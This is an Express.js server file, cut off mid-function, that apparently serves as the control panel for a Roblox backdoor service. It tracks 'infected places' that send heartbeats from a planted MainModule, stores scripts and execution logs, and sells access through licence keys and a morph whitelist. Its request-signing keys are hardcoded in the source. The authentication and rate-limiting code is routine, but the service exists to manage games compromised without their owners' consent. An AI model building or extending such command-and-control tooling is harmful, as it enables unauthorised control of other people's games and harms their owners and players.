const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const luaobf = require('./lib/luaobf');

const app = express();

// ----- config -----
const PORT = process.env.PORT || 3000;
const PROD = process.env.NODE_ENV === 'production';

const DATA_DIR = path.join(__dirname, 'data');
const PUBLIC_DIR = path.join(__dirname, 'public');

const DEVS_FILE    = path.join(DATA_DIR, 'devs.json');
const USERS_FILE   = path.join(DATA_DIR, 'users.json');
const KEYS_FILE    = path.join(DATA_DIR, 'keys.json');
const SCRIPTS_FILE = path.join(DATA_DIR, 'scripts.json');
const LOGS_FILE    = path.join(DATA_DIR, 'logs.json');
const AUDIT_FILE   = path.join(DATA_DIR, 'audit.json');
const PLACES_FILE  = path.join(DATA_DIR, 'places.json');
const MORPHS_FILE          = path.join(DATA_DIR, 'morphs.json');
const MORPH_CUSTOM_FILE    = path.join(DATA_DIR, 'morph-custom.json');
const MORPH_WL_FILE        = path.join(DATA_DIR, 'morph-whitelist.json');
const MORPH_LOG_FILE       = path.join(DATA_DIR, 'morph-log.json');
const SECRET_FILE  = path.join(DATA_DIR, '.session-secret');

const LOG_MAX   = 2000;     // execution log entries
const AUDIT_MAX = 5000;     // audit log entries

// the bootstrap owner. always promoted to owner on startup. cannot be deleted.
// override with env OWNER_USERNAME.
const OWNER_USERNAME = (process.env.OWNER_USERNAME || 'bruvo').trim();

// optional shared secret for the Roblox -> /api/games/heartbeat call.
// if set, the heartbeat body must include { secret: HEARTBEAT_SECRET } or the request is rejected.
// leave unset to keep the endpoint open (rate-limited only).
const HEARTBEAT_SECRET = (process.env.HEARTBEAT_SECRET || '').trim();


// auto-stale policy for the persistent places registry. places whose lastSeen is older
// than this many days get pruned automatically. set PLACE_STALE_DAYS=0 to keep forever.
// default: 30 days.
const PLACE_STALE_DAYS = (() => {
  const raw = process.env.PLACE_STALE_DAYS;
  if (raw === undefined || raw === '') return 30;
  const n = parseInt(raw, 10);
  return Number.isFinite(n) && n >= 0 ? n : 30;
})();
const PLACE_PRUNE_INTERVAL_MS = 60 * 60 * 1000; // run pruner every hour

// ----- helpers -----
function loadSessionSecret() {
  if (process.env.SESSION_SECRET) return process.env.SESSION_SECRET;
  fs.mkdirSync(DATA_DIR, { recursive: true });
  if (fs.existsSync(SECRET_FILE)) {
    const s = fs.readFileSync(SECRET_FILE, 'utf8').trim();
    if (s.length >= 32) return s;
  }
  const fresh = crypto.randomBytes(48).toString('hex');
  fs.writeFileSync(SECRET_FILE, fresh, { mode: 0o600 });
  return fresh;
}
const SESSION_SECRET = loadSessionSecret();

function readJson(file, fallback) {
  try { return fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, 'utf8')) : fallback; }
  catch { return fallback; }
}
function writeJson(file, data) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function seed() {
  fs.mkdirSync(DATA_DIR, { recursive: true });
  if (!fs.existsSync(DEVS_FILE)) {
    const u = process.env.SEED_DEV_USERNAME || OWNER_USERNAME;
    const p = process.env.SEED_DEV_PASSWORD || '';
    if (!p) {
      console.error('[seed] refusing to create bootstrap dev with an empty password.');
      console.error('[seed] set SEED_DEV_PASSWORD env var (e.g. SEED_DEV_PASSWORD=...) and re-run.');
      console.error('[seed] this is a one-time setup — rotate it from the website afterwards.');
      process.exit(1);
    }
    writeJson(DEVS_FILE, [{
      username: u,
      passwordHash: bcrypt.hashSync(p, 10),
      isOwner: true,
      createdAt: new Date().toISOString()
    }]);
  } else {
    // migration: ensure the bootstrap owner has isOwner=true; ensure at least one owner exists
    const devs = readJson(DEVS_FILE, []);
    let changed = false;
    const bootstrap = devs.find(d => d.username === OWNER_USERNAME);
    if (bootstrap && !bootstrap.isOwner) { bootstrap.isOwner = true; changed = true; }
    if (!devs.some(d => d.isOwner) && bootstrap) { bootstrap.isOwner = true; changed = true; }
    if (changed) writeJson(DEVS_FILE, devs);
  }
  if (!fs.existsSync(USERS_FILE))   writeJson(USERS_FILE, []);
  if (!fs.existsSync(KEYS_FILE))    writeJson(KEYS_FILE, []);
  if (!fs.existsSync(SCRIPTS_FILE)) writeJson(SCRIPTS_FILE, []);
  if (!fs.existsSync(LOGS_FILE))    writeJson(LOGS_FILE, []);
  if (!fs.existsSync(AUDIT_FILE))   writeJson(AUDIT_FILE, []);
  if (!fs.existsSync(PLACES_FILE))  writeJson(PLACES_FILE, []);
  if (!fs.existsSync(MORPHS_FILE))        writeJson(MORPHS_FILE, {});
  if (!fs.existsSync(MORPH_CUSTOM_FILE))  writeJson(MORPH_CUSTOM_FILE, {});
  if (!fs.existsSync(MORPH_WL_FILE))      writeJson(MORPH_WL_FILE, []);
  if (!fs.existsSync(MORPH_LOG_FILE))     writeJson(MORPH_LOG_FILE, []);
}
seed();

// One-time migration: copy all built-in morphs from morphs.json into the custom
// store so the owner can edit/delete every entry from /morphs. Marker file
// guards re-imports. To re-run, delete data/.morph-imported.
const MORPH_IMPORTED_FLAG = path.join(DATA_DIR, '.morph-imported');
(function migrateBuiltinsIfNeeded() {
  if (fs.existsSync(MORPH_IMPORTED_FLAG)) return;
  const builtin = readJson(MORPHS_FILE, {});
  const custom  = readJson(MORPH_CUSTOM_FILE, {});
  const builtinNames = Object.keys(builtin);
  if (builtinNames.length === 0) return;
  let added = 0;
  for (const name of builtinNames) {
    if (!custom[name]) {
      custom[name] = {
        ...builtin[name],
        addedBy: 'system',
        addedAt: new Date().toISOString()
      };
      added++;
    }
  }
  writeJson(MORPH_CUSTOM_FILE, custom);
  fs.writeFileSync(MORPH_IMPORTED_FLAG, new Date().toISOString());
  console.log(`[morphs] migrated ${added}/${builtinNames.length} built-in morphs into custom store`);
})();

// ----- infected places registry (persistent) -----
// every game that has ever heartbeated is remembered here, so a place still shows
// up in /games even if it has no live servers right now. flushed to disk lazily.
const infectedPlaces = new Map();
let placesDirty = false;
(function loadInfectedPlaces() {
  const arr = readJson(PLACES_FILE, []);
  if (Array.isArray(arr)) {
    for (const p of arr) {
      if (p && p.placeId) infectedPlaces.set(String(p.placeId), p);
    }
  }
})();
function savePlacesIfDirty() {
  if (!placesDirty) return;
  try { writeJson(PLACES_FILE, [...infectedPlaces.values()]); placesDirty = false; }
  catch (e) { console.error('[places]', e && e.message); }
}
setInterval(savePlacesIfDirty, 60 * 1000).unref();
process.on('SIGTERM', savePlacesIfDirty);
process.on('SIGINT', () => { savePlacesIfDirty(); process.exit(0); });

// auto-stale pruner: drop places that haven't heartbeated in PLACE_STALE_DAYS days.
function pruneStalePlaces() {
  if (PLACE_STALE_DAYS <= 0) return 0;
  const cutoff = Date.now() - PLACE_STALE_DAYS * 24 * 3600 * 1000;
  const removed = [];
  for (const [pid, p] of infectedPlaces) {
    const last = p && p.lastSeen ? new Date(p.lastSeen).getTime() : 0;
    if (!last || last < cutoff) {
      infectedPlaces.delete(pid);
      removed.push(pid);
    }
  }
  if (removed.length) {
    placesDirty = true;
    savePlacesIfDirty();
    audit(null, 'place.auto_pruned', null, {
      count: removed.length,
      sample: removed.slice(0, 20),
      staleDays: PLACE_STALE_DAYS
    });
    console.log(`[places] auto-pruned ${removed.length} stale place(s) (>${PLACE_STALE_DAYS}d, last seen)`);
  }
  return removed.length;
}
pruneStalePlaces();
setInterval(pruneStalePlaces, PLACE_PRUNE_INTERVAL_MS).unref();

if (PROD) app.set('trust proxy', 1);

// ----- security headers -----
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'same-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline'",
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "font-src 'self' https://fonts.gstatic.com data:",
    // allow Roblox CDN for game icons
    "img-src 'self' data: https://*.rbxcdn.com https://www.roblox.com https://tr.rbxcdn.com",
    "connect-src 'self'",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "object-src 'none'"
  ].join('; '));
  if (PROD) res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  next();
});

app.use(express.json({ limit: '128kb' }));
app.use(express.urlencoded({ extended: true, limit: '32kb' }));

app.use(session({
  name: 'skl.sid',
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  rolling: true,
  cookie: {
    maxAge: 1000 * 60 * 60 * 24 * 30,
    httpOnly: true,
    sameSite: 'lax',
    secure: PROD
  }
}));

// ----- rate limiting -----
const buckets = new Map();
function rateLimit({ windowMs, max, message = 'too many requests, please slow down' }) {
  return (req, res, next) => {
    const id = `${req.ip}:${req.route?.path || req.path}`;
    const now = Date.now();
    const arr = (buckets.get(id) || []).filter(t => now - t < windowMs);
    if (arr.length >= max) {
      res.setHeader('Retry-After', Math.ceil((arr[0] + windowMs - now) / 1000));
      return res.status(429).json({ error: message });
    }
    arr.push(now);
    buckets.set(id, arr);
    next();
  };
}
setInterval(() => {
  const cutoff = Date.now() - 60 * 60 * 1000;
  for (const [k, arr] of buckets) {
    const fresh = arr.filter(t => t > cutoff);
    if (fresh.length) buckets.set(k, fresh);
    else buckets.delete(k);
  }
}, 10 * 60 * 1000).unref();

const loginLimiter     = rateLimit({ windowMs: 15 * 60 * 1000, max: 8,   message: 'too many sign-in attempts. try again in a few minutes.' });
const signupLimiter    = rateLimit({ windowMs: 60 * 60 * 1000, max: 6,   message: 'too many account attempts. try again later.' });
const heartbeatLimiter = rateLimit({ windowMs: 60 * 1000,      max: 120, message: 'too many heartbeats' });
const checkLimiter     = rateLimit({ windowMs: 60 * 1000,      max: 240, message: 'too many checks' });
const logLimiter       = rateLimit({ windowMs: 60 * 1000,      max: 240, message: 'too many log writes' });
const likeLimiter      = rateLimit({ windowMs: 60 * 1000,      max: 60,  message: 'slow down on the likes' });
const writeLimiter     = rateLimit({ windowMs: 60 * 1000,      max: 60,  message: 'slow down' });
const auditLimiter     = rateLimit({ windowMs: 60 * 1000,      max: 60,  message: 'too many requests' });
const morphCheckLimiter= rateLimit({ windowMs: 60 * 1000,      max: 120, message: 'too many checks' });
const morphLogLimiter  = rateLimit({ windowMs: 60 * 1000,      max: 240, message: 'too many uses logged' });
// Tight cap on /api/morphs/entry: a legit player firing morphs hits this once
// per unique morph (then the in-game cache covers repeats). A scraper trying
// to pull the whole catalog (~7000 entries) would have to spend ~4 hours per
// IP at this rate. Combined with the one-time-use nonce requirement, that
// makes mass scraping prohibitively painful.
const morphEntryLimiter= rateLimit({ windowMs: 60 * 1000,      max: 30,  message: 'too many morph fetches' });

// ----- in-memory state -----
const HEARTBEAT_TTL = 30 * 1000;
const ACTIVITY_WINDOW = 24 * 60 * 60 * 1000;

const activeGames = new Map();
const userActivity = new Map();

function touchActivity(username) { if (username) userActivity.set(username, Date.now()); }

setInterval(() => {
  const gameCutoff = Date.now() - HEARTBEAT_TTL;
  for (const [k, g] of activeGames) if (g.lastSeen < gameCutoff) activeGames.delete(k);
  const userCutoff = Date.now() - ACTIVITY_WINDOW;
  for (const [k, t] of userActivity) if (t < userCutoff) userActivity.delete(k);
}, 10 * 1000).unref();

app.use((req, res, next) => {
  if (req.session && req.session.user) touchActivity(req.session.user.username);
  next();
});

// ----- audit log -----
function audit(req, event, target, details = {}) {
  try {
    const u = req && req.session && req.session.user;
    const entry = {
      id: crypto.randomUUID(),
      at: new Date().toISOString(),
      actor: u ? u.username : null,
      kind: u ? u.kind : (req ? 'anon' : 'system'),
      event: String(event).slice(0, 64),
      target: target ? String(target).slice(0, 80) : null,
      details: details && typeof details === 'object' ? details : {},
      ip: req ? String(req.ip || '').slice(0, 64) : null
    };
    const all = readJson(AUDIT_FILE, []);
    all.unshift(entry);
    if (all.length > AUDIT_MAX) all.length = AUDIT_MAX;
    writeJson(AUDIT_FILE, all);
  } catch (e) {
    // never let audit failure break a request
    console.error('[audit]', e && e.message);
  }
}

// ----- key helpers -----
function genKey() {
  const raw = crypto.randomBytes(12).toString('hex').toUpperCase();
  return `SKL-${raw.slice(0,4)}-${raw.slice(4,8)}-${raw.slice(8,12)}-${raw.slice(12,16)}-${raw.slice(16,20)}-${raw.slice(20,24)}`;
}

const USERNAME_RE = /^[a-zA-Z0-9_-]+$/;
function validUsername(u) { return typeof u === 'string' && u.length >= 3 && u.length <= 24 && USERNAME_RE.test(u); }

// ----- session helpers -----
function userStillExists(session) {
  if (!session || !session.user) return false;
  const { username, kind } = session.user;
  const file = kind === 'dev' ? DEVS_FILE : USERS_FILE;
  const all = readJson(file, []);
  return !!all.find(u => u.username === username);
}
function isOwnerUsername(username) {
  if (!username) return false;
  const devs = readJson(DEVS_FILE, []);
  const d = devs.find(x => x.username === username);
  return !!(d && d.isOwner);
}
// Devs always have morph access. Regular users need to be promoted by an owner
// (sets isMorph=true on their users.json record).
function hasMorphAccess(username) {
  if (!username) return false;
  const devs = readJson(DEVS_FILE, []);
  if (devs.find(x => x.username === username)) return true;
  const users = readJson(USERS_FILE, []);
  const u = users.find(x => x.username === username);
  return !!(u && u.isMorph);
}
function requireUser(req, res, next) {
  if (!req.session.user) return res.status(401).json({ error: 'sign in to continue' });
  if (!userStillExists(req.session)) {
    return req.session.destroy(() => {
      res.clearCookie('skl.sid');
      res.status(401).json({ error: 'account no longer exists' });
    });
  }
  next();
}
function requireDev(req, res, next) {
  if (!req.session.user || req.session.user.kind !== 'dev') return res.status(403).json({ error: 'developers only' });
  if (!userStillExists(req.session)) {
    return req.session.destroy(() => {
      res.clearCookie('skl.sid');
      res.status(401).json({ error: 'account no longer exists' });
    });
  }
  next();
}
function requireOwner(req, res, next) {
  const u = req.session.user;
  if (!u || u.kind !== 'dev') return res.status(403).json({ error: 'owner only' });
  if (!userStillExists(req.session) || !isOwnerUsername(u.username)) {
    return res.status(403).json({ error: 'owner only' });
  }
  next();
}
function requireMorphAccess(req, res, next) {
  const u = req.session.user;
  if (!u) return res.status(403).json({ error: 'morph access required' });
  if (!userStillExists(req.session)) {
    return req.session.destroy(() => {
      res.clearCookie('skl.sid');
      res.status(401).json({ error: 'account no longer exists' });
    });
  }
  if (!hasMorphAccess(u.username)) return res.status(403).json({ error: 'morph access required' });
  next();
}
// Shared XOR key with the Roblox MainModule. Used to obfuscate the username
// in ?u= so that drive-by scrapers can't just guess plaintext usernames.
// NOT real security on its own — anyone who can decompile the published
// model can extract this key. The HMAC tag below adds the actual auth.
const MORPH_USERNAME_KEY = Buffer.from(
  '8c5eb959e260fa77680c7466f16c9ad7f7d94f19ed52dc122a9362b722e99b2f',
  'hex'
);
// HMAC-SHA256 key shared with MainModule. Used to sign every morph API
// request alongside a server-issued one-time nonce. Even an attacker who
// extracts BOTH keys must continuously fetch fresh nonces from the rate-
// limited /api/morphs/nonce endpoint to forge requests.
const MORPH_MAC_KEY = Buffer.from(
  'bb9d2ccc55c3df174e693c79c41c3f6111a8606e85214783615a805532b590ee',
  'hex'
);
const MORPH_REPLAY_WINDOW_MS = 5 * 60 * 1000;
const MORPH_NONCE_TTL_MS = 60 * 1000;

// In-memory one-time-use nonce store. Map<nonceHex, expiresAtMs>.
// Pruned every 30s. On server restart, all in-flight nonces become invalid —
// clients retry with a fresh nonce, no user-visible breakage.
const morphNonces = new Map();
function pruneMorphNonces() {
  const now = Date.now();
  for (const [n, exp] of morphNonces) if (exp < now) morphNonces.delete(n);
}
setInterval(pruneMorphNonces, 30 * 1000).unref();

function issueMorphNonce() {
  const n = crypto.randomBytes(32).toString('hex');
  morphNonces.set(n, Date.now() + MORPH_NONCE_TTL_MS);
  return n;
}
function consumeMorphNonce(n) {
  if (typeof n !== 'string' || n.length !== 64 || !/^[0-9a-f]+$/i.test(n)) return false;
  const exp = morphNonces.get(n);
  if (!exp) return false;
  if (exp < Date.now()) { morphNonces.delete(n); return false; }
  morphNonces.delete(n); // one-time-use
  return true;
}
function expectedMorphMac(message) {
  return crypto.createHmac('sha256', MORPH_MAC_KEY).update(message).digest('hex');
}
function timingSafeHexEq(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string' || a.length !== b.length) return false;
  try {
    return crypto.timingSafeEqual(Buffer.from(a, 'hex'), Buffer.from(b, 'hex'));
  } catch { return false; }
}

function decryptMorphUsername(hex) {
  if (typeof hex !== 'string' || hex.length === 0 || hex.length > 512) return null;
  if (!/^[0-9a-f]+$/i.test(hex) || hex.length % 2 !== 0) return null;
  let cipher;
  try { cipher = Buffer.from(hex, 'hex'); } catch { return null; }
  const plain = Buffer.alloc(cipher.length);
  for (let i = 0; i < cipher.length; i++) {
    plain[i] = cipher[i] ^ MORPH_USERNAME_KEY[i % MORPH_USERNAME_KEY.length];
  }
  let text;
  try { text = plain.toString('utf8'); } catch { return null; }
  const idx = text.lastIndexOf(':');
  if (idx < 0) return null;
  const username = text.slice(0, idx);
  const ts = parseInt(text.slice(idx + 1), 10);
  if (!Number.isFinite(ts) || ts <= 0) return null;
  const skew = Math.abs(Date.now() - ts * 1000);
  if (skew > MORPH_REPLAY_WINDOW_MS) return null;
  if (!username || username.length > 64) return null;
  return username;
}

// Gates the public morph endpoints. Two ways to pass:
//   1. Logged-in morph-access user via session cookie (admin UI on /morphs).
//   2. ?u=<hex>&n=<nonce>&t=<unixSec>&s=<hmacHex>
//      MainModule first fetches a nonce from /api/morphs/nonce, then signs
//      (u + ":" + n + ":" + t) with MORPH_MAC_KEY. Server consumes the nonce
//      (one-time use) and verifies the HMAC before decrypting the username.
//      Captured tokens can't be replayed; bit-flipped tokens fail HMAC check.
//
// Transition note: if the client sends `u` without `n/t/s`, we currently
// fall through to the legacy XOR-only check. Once MainModule is republished,
// MORPH_REQUIRE_HMAC=1 turns the strict mode on.
const MORPH_REQUIRE_HMAC = process.env.MORPH_REQUIRE_HMAC === '1';

function requireMorphToken(req, res, next) {
  const sessUser = req.session && req.session.user;
  if (sessUser && hasMorphAccess(sessUser.username)) {
    req.morphUser = sessUser.username;
    return next();
  }

  const u = String((req.query && req.query.u) || '').trim();
  if (!u) return res.status(403).json({ error: 'forbidden' });

  const n = String((req.query && req.query.n) || '').trim();
  const t = String((req.query && req.query.t) || '').trim();
  const s = String((req.query && req.query.s) || '').trim();
  const hasSignature = n && t && s;

  if (MORPH_REQUIRE_HMAC && !hasSignature) {
    return res.status(403).json({ error: 'forbidden' });
  }

  if (hasSignature) {
    if (!consumeMorphNonce(n)) return res.status(403).json({ error: 'forbidden' });
    const expected = expectedMorphMac(u + ':' + n + ':' + t);
    if (!timingSafeHexEq(expected, s)) return res.status(403).json({ error: 'forbidden' });
    const ts = parseInt(t, 10);
    if (!Number.isFinite(ts) || Math.abs(Date.now() - ts * 1000) > MORPH_REPLAY_WINDOW_MS) {
      return res.status(403).json({ error: 'forbidden' });
    }
  }

  const username = decryptMorphUsername(u);
  if (!username) return res.status(403).json({ error: 'forbidden' });

  const wl = readJson(MORPH_WL_FILE, []);
  const entry = wl.find(e => e.username.toLowerCase() === username.toLowerCase());
  if (!entry) return res.status(403).json({ error: 'forbidden' });
  if (entry.expires && new Date(entry.expires).getTime() < Date.now()) {
    return res.status(403).json({ error: 'expired' });
  }

  req.morphUser = entry.username;
  next();
}

function ensureGameToken(record, file, all) {
  if (!record.gameToken) {
    record.gameToken = crypto.randomBytes(18).toString('hex');
    writeJson(file, all);
  }
  return record.gameToken;
}

// ===== AUTH =====
app.post('/api/auth/signup', signupLimiter, (req, res) => {
  const { key, username, password } = req.body || {};
  if (typeof key !== 'string' || typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'all fields are required' });
  }
  if (!key || !username || !password) return res.status(400).json({ error: 'all fields are required' });
  if (!validUsername(username))        return res.status(400).json({ error: 'username must be 3–24 chars, letters/numbers/_/- only' });
  if (password.length < 8 || password.length > 128) return res.status(400).json({ error: 'password must be 8–128 characters' });

  const keys = readJson(KEYS_FILE, []);
  const k = keys.find(x => x.key === key.trim());
  if (!k)                                                  return res.status(404).json({ error: 'invalid key' });
  if (k.consumed)                                          return res.status(403).json({ error: 'this key has already been used' });
  if (k.revoked)                                           return res.status(403).json({ error: 'this key has been revoked' });
  if (k.expiresAt && new Date(k.expiresAt) < new Date())   return res.status(403).json({ error: 'this key has expired' });
  // key is bound to a specific username
  if (k.boundUsername && k.boundUsername !== username)     return res.status(403).json({ error: `this key is reserved for username "${k.boundUsername}"` });

  const users = readJson(USERS_FILE, []);
  const devs  = readJson(DEVS_FILE, []);
  if (users.find(u => u.username === username) || devs.find(d => d.username === username)) {
    return res.status(409).json({ error: 'that username is taken' });
  }

  users.push({
    username,
    passwordHash: bcrypt.hashSync(password, 10),
    createdAt: new Date().toISOString(),
    keyUsed: k.key,
    gameToken: crypto.randomBytes(18).toString('hex')
  });
  writeJson(USERS_FILE, users);

  k.consumed = true;
  k.consumedBy = username;
  k.consumedAt = new Date().toISOString();
  writeJson(KEYS_FILE, keys);

  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'session error' });
    req.session.user = { username, kind: 'user' };
    audit(req, 'auth.signup', username, { keyUsed: k.key });
    res.json({ ok: true, user: req.session.user });
  });
});

// Pre-computed bcrypt hash of a random throwaway. We bcrypt-compare against
// this when no user is found so every login takes the same amount of time
// regardless of whether the username exists. Closes timing-based username
// enumeration.
const DUMMY_PASSWORD_HASH = bcrypt.hashSync(crypto.randomBytes(24).toString('hex'), 10);

app.post('/api/auth/login', loginLimiter, (req, res) => {
  const { username, password } = req.body || {};
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'username and password are required' });
  }
  if (!username || !password) return res.status(400).json({ error: 'username and password are required' });
  if (username.length > 64 || password.length > 256) return res.status(400).json({ error: 'wrong username or password' });

  const devs  = readJson(DEVS_FILE, []);
  const users = readJson(USERS_FILE, []);
  let user = devs.find(u => u.username === username);
  let kind = 'dev';
  let bucketFile = DEVS_FILE;
  let bucketAll = devs;
  if (!user) { user = users.find(u => u.username === username); kind = 'user'; bucketFile = USERS_FILE; bucketAll = users; }

  // Always run bcrypt to keep timing constant. If the user doesn't exist we
  // hash against a random hash that nothing will ever match.
  const hashToCheck = user ? user.passwordHash : DUMMY_PASSWORD_HASH;
  const passwordOk = bcrypt.compareSync(password, hashToCheck);
  if (!user || !passwordOk) {
    audit(req, 'auth.login_failed', username, {});
    return res.status(401).json({ error: 'wrong username or password' });
  }
  ensureGameToken(user, bucketFile, bucketAll);
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'session error' });
    req.session.user = { username: user.username, kind };
    audit(req, 'auth.login', user.username, { kind });
    res.json({ ok: true, user: req.session.user });
  });
});

app.post('/api/auth/logout', (req, res) => {
  const u = req.session.user;
  if (u) audit(req, 'auth.logout', u.username, {});
  req.session.destroy(() => {
    res.clearCookie('skl.sid');
    res.json({ ok: true });
  });
});

app.get('/api/session', (req, res) => {
  if (!req.session.user) return res.json({ user: null });
  const u = req.session.user;
  const isOwner = isOwnerUsername(u.username) && u.kind === 'dev';
  const isMorph = hasMorphAccess(u.username);
  res.json({ user: { ...u, isOwner, isMorph } });
});

// ===== DEVS (owner only) =====
app.get('/api/devs', requireOwner, (req, res) => {
  const devs = readJson(DEVS_FILE, []);
  res.json({
    devs: devs.map(d => ({
      username: d.username,
      createdAt: d.createdAt,
      addedBy: d.addedBy || null,
      isOwner: !!d.isOwner,
      isBootstrap: d.username === OWNER_USERNAME
    }))
  });
});

app.post('/api/devs', writeLimiter, requireOwner, (req, res) => {
  const { username, password, owner } = req.body || {};
  if (typeof username !== 'string' || typeof password !== 'string') return res.status(400).json({ error: 'username and password are required' });
  if (!validUsername(username)) return res.status(400).json({ error: 'username must be 3–24 chars, letters/numbers/_/- only' });
  if (password.length < 8 || password.length > 128) return res.status(400).json({ error: 'password must be 8–128 characters' });

  const devs  = readJson(DEVS_FILE, []);
  const users = readJson(USERS_FILE, []);
  if (devs.find(d => d.username === username) || users.find(u => u.username === username)) {
    return res.status(409).json({ error: 'that username is taken' });
  }
  const newDev = {
    username,
    passwordHash: bcrypt.hashSync(password, 10),
    createdAt: new Date().toISOString(),
    gameToken: crypto.randomBytes(18).toString('hex'),
    addedBy: req.session.user.username,
    isOwner: !!owner
  };
  devs.push(newDev);
  writeJson(DEVS_FILE, devs);
  audit(req, 'dev.created', username, { isOwner: !!owner });
  res.json({ ok: true, username, isOwner: !!owner });
});

app.delete('/api/devs/:username', writeLimiter, requireOwner, (req, res) => {
  const target = req.params.username;
  if (!validUsername(target)) return res.status(400).json({ error: 'invalid username' });
  if (target === OWNER_USERNAME) return res.status(400).json({ error: 'cannot remove the bootstrap owner' });
  if (target === req.session.user.username) return res.status(400).json({ error: 'you cannot remove yourself here' });
  let devs = readJson(DEVS_FILE, []);
  const dev = devs.find(d => d.username === target);
  if (!dev) return res.status(404).json({ error: 'not found' });
  // require demote first if removing another owner
  if (dev.isOwner) return res.status(400).json({ error: 'demote this owner before removing' });
  devs = devs.filter(d => d.username !== target);
  writeJson(DEVS_FILE, devs);
  userActivity.delete(target);
  audit(req, 'dev.deleted', target, {});
  res.json({ ok: true });
});

app.post('/api/devs/:username/promote', writeLimiter, requireOwner, (req, res) => {
  const target = req.params.username;
  if (!validUsername(target)) return res.status(400).json({ error: 'invalid username' });
  const devs = readJson(DEVS_FILE, []);
  const d = devs.find(x => x.username === target);
  if (!d) return res.status(404).json({ error: 'not found' });
  if (d.isOwner) return res.json({ ok: true, isOwner: true });
  d.isOwner = true;
  writeJson(DEVS_FILE, devs);
  audit(req, 'dev.promoted', target, {});
  res.json({ ok: true, isOwner: true });
});

app.post('/api/devs/:username/demote', writeLimiter, requireOwner, (req, res) => {
  const target = req.params.username;
  if (!validUsername(target)) return res.status(400).json({ error: 'invalid username' });
  if (target === OWNER_USERNAME) return res.status(400).json({ error: 'cannot demote the bootstrap owner' });
  const devs = readJson(DEVS_FILE, []);
  const d = devs.find(x => x.username === target);
  if (!d) return res.status(404).json({ error: 'not found' });
  if (!d.isOwner) return res.json({ ok: true, isOwner: false });
  // ensure at least one owner remains
  const owners = devs.filter(x => x.isOwner).length;
  if (owners <= 1) return res.status(400).json({ error: 'must keep at least one owner' });
  d.isOwner = false;
  writeJson(DEVS_FILE, devs);
  audit(req, 'dev.demoted', target, {});
  res.json({ ok: true, isOwner: false });
});

// ===== USERS (owner only — for managing the morph role) =====
app.get('/api/users', requireOwner, (req, res) => {
  const users = readJson(USERS_FILE, []);
  res.json({
    users: users.map(u => ({
      username: u.username,
      createdAt: u.createdAt || null,
      keyUsed: u.keyUsed || null,
      isMorph: !!u.isMorph,
    }))
  });
});

app.post('/api/users/:username/promote-morph', writeLimiter, requireOwner, (req, res) => {
  const target = req.params.username;
  if (!validUsername(target)) return res.status(400).json({ error: 'invalid username' });
  const users = readJson(USERS_FILE, []);
  const u = users.find(x => x.username === target);
  if (!u) return res.status(404).json({ error: 'not found' });
  if (u.isMorph) return res.json({ ok: true, isMorph: true });
  u.isMorph = true;
  u.morphPromotedAt = new Date().toISOString();
  u.morphPromotedBy = req.session.user.username;
  writeJson(USERS_FILE, users);
  audit(req, 'user.morph_promoted', target, {});
  res.json({ ok: true, isMorph: true });
});

app.post('/api/users/:username/demote-morph', writeLimiter, requireOwner, (req, res) => {
  const target = req.params.username;
  if (!validUsername(target)) return res.status(400).json({ error: 'invalid username' });
  const users = readJson(USERS_FILE, []);
  const u = users.find(x => x.username === target);
  if (!u) return res.status(404).json({ error: 'not found' });
  if (!u.isMorph) return res.json({ ok: true, isMorph: false });
  u.isMorph = false;
  delete u.morphPromotedAt;
  delete u.morphPromotedBy;
  writeJson(USERS_FILE, users);
  audit(req, 'user.morph_demoted', target, {});
  res.json({ ok: true, isMorph: false });
});

// ===== KEYS (owner only) =====
app.get('/api/keys', requireOwner, (req, res) => {
  res.json({ keys: readJson(KEYS_FILE, []) });
});

app.post('/api/keys', writeLimiter, requireOwner, (req, res) => {
  const { username, durationHours = 0, note = '' } = req.body || {};
  if (!validUsername(username)) return res.status(400).json({ error: 'username is required (3–24 chars, letters/numbers/_/-)' });

  const devs  = readJson(DEVS_FILE, []);
  const users = readJson(USERS_FILE, []);
  const keys  = readJson(KEYS_FILE, []);
  // username must be unique across devs, users, AND unconsumed keys (no double-reservation)
  if (devs.find(d => d.username === username) || users.find(u => u.username === username)) {
    return res.status(409).json({ error: 'that username is already taken by an account' });
  }
  if (keys.find(k => !k.consumed && !k.revoked && k.boundUsername === username && (!k.expiresAt || new Date(k.expiresAt) >= new Date()))) {
    return res.status(409).json({ error: 'a live key already reserves that username' });
  }

  const dh = Math.max(parseInt(durationHours, 10) || 0, 0);
  const safeNote = String(note || '').slice(0, 120);
  const k = {
    key: genKey(),
    boundUsername: username,
    createdBy: req.session.user.username,
    createdAt: new Date().toISOString(),
    expiresAt: dh > 0 ? new Date(Date.now() + dh * 3600 * 1000).toISOString() : null,
    consumed: false,
    revoked: false,
    note: safeNote
  };
  keys.push(k);
  writeJson(KEYS_FILE, keys);
  audit(req, 'key.created', k.key, { boundUsername: username, durationHours: dh });
  res.json({ ok: true, minted: [k] });
});

function purgeUserByKey(key) {
  const users = readJson(USERS_FILE, []);
  const removed = users.filter(u => u.keyUsed === key);
  if (!removed.length) return [];
  writeJson(USERS_FILE, users.filter(u => u.keyUsed !== key));
  for (const u of removed) userActivity.delete(u.username);
  return removed.map(u => u.username);
}

app.post('/api/keys/:key/revoke', writeLimiter, requireOwner, (req, res) => {
  const keys = readJson(KEYS_FILE, []);
